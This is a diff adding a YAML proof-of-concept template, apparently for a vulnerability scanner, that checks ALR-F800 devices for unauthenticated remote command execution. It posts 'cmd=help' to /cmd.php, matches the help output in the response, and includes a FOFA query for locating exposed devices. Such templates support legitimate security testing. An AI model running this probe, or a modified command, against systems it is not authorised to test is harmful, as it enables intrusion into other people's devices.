@@ -1,0 +1,19 @@
+id: poc-yaml-alr-f800-cmd-php-rce
+info:
+  name: ALR-F800 cmd.php 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: alr-f800
+  fofa: body="ALR-F800"
+requests:
+- method: POST
+  path: /cmd.php
+  headers:
+    Content-type: application/x-www-form-urlencoded
+  data: cmd=help
+  expression: "status_code == 200 && \ncontains(body,\"GENERAL COMMANDS\") &&\ncontains(body,\"\
+    Help:\") &&\ncontains(body,\"Display current settings\") &&\ncontains(headers,\"\
+    text/plain\")\n"
+variables: {}
+transport: http
